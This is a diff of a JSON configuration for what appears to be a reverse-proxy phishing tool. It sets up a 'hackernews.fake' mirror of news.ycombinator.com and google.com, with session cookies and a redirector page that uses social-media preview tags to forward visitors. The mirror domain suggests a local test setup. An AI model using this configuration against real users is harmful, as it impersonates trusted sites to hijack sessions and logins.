@@ -3,8 +3,8 @@
     "campaignId": "hackernews",
     "mirrorDomain": "hackernews.fake",
     "description": "HackerNews local mirror",
-    "landingUpgradePath": "/fake-auth",
-    "sessionCookieName": "fake-sess",
+    "upgradeSessionPath": "/fake-upgrade-session",
+    "sessionCookieName": "fake-sess-hackernews",
     "sessionExpire": 86400000,
     "newSessionExpire": 300000,
     "messageExpire": 3600000
@@ -19,7 +19,7 @@
   "targets": [
     {
       "targetId": "root",
-      "isLanding": true,
+      "accessLevel": "landing",
       "donorSecure": true,
       "donorSub": "news",
       "donorDomain": "ycombinator.com",
@@ -40,11 +40,12 @@
       "faviconIco": "AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAD///8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\n",
       "robotsTxt": "User-agent: *\nDisallow: /\n",
       "sitemapXml": "",
+      "allowWebSockets": false,
       "isEnabled": true
     },
     {
       "targetId": "google-www",
-      "isLanding": true,
+      "accessLevel": "landing",
       "donorSecure": true,
       "donorSub": "www",
       "donorDomain": "google.com",
@@ -65,13 +66,18 @@
       "faviconIco": "",
       "robotsTxt": "",
       "sitemapXml": "",
+      "allowWebSockets": false,
       "isEnabled": true
     }
   ],
   "redirectors": [
     {
       "redirectorId": "simple",
-      "page": "<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<% if (data.og_title) { %>\n    <meta property=\"og:title\" content=\"<%= data.og_title %>\">\n<% } %>\n<% if (data.og_desc) { %>\n    <meta property=\"og:description\" content=\"<%= data.og_desc %>\">\n<% } %>\n<% if (data.og_image) { %>\n    <meta property=\"og:image\" content=\"<%= data.og_image %>\">\n<% } %>\n<% if (data.og_url) { %>\n    <meta property=\"og:url\" content=\"<%= data.og_url %>\">\n<% } %>\n    <title>You will be redirected...</title>\n    <style>\n      body {\n        font-family: Arial, sans-serif;\n        text-align: center;\n        padding: 10px;\n      }\n    </style>\n  </head>\n  <body>\n    <p>You will be redirected...</p>\n    <script>\n<% if (data.upgrade_url) { %>\n      setTimeout(() => {\n        window.location.assign(\"<%= data.upgrade_url %>\");\n      }, 1000);\n<% } %>\n    </script>\n  </body>\n</html>\n"
+      "page": "<!doctype html>\n<html lang=\"en\">\n  <head>\n    <meta charset=\"utf-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<% if (data.og_title) { %>\n    <meta property=\"og:title\" content=\"<%= data.og_title %>\">\n<% } %>\n<% if (data.og_desc) { %>\n    <meta property=\"og:description\" content=\"<%= data.og_desc %>\">\n<% } %>\n<% if (data.og_image) { %>\n    <meta property=\"og:image\" content=\"<%= data.og_image %>\">\n<% } %>\n<% if (data.og_url) { %>\n    <meta property=\"og:url\" content=\"<%= data.og_url %>\">\n<% } %>\n    <title>You will be redirected...</title>\n    <style>\n      body {\n        font-family: Arial, sans-serif;\n        text-align: center;\n        padding: 10px;\n      }\n    </style>\n  </head>\n  <body>\n    <p>You will be redirected...</p>\n    <script>\n<% if (data.upgrade_url) { %>\n      setTimeout(() => {\n        window.location.assign(\"<%= data.upgrade_url %>\");\n      }, 1000);\n<% } %>\n    </script>\n  </body>\n</html>\n",
+      "fields": [
+        "og_title",
+        "og_description"
+      ]
     }
   ],
   "lures": [
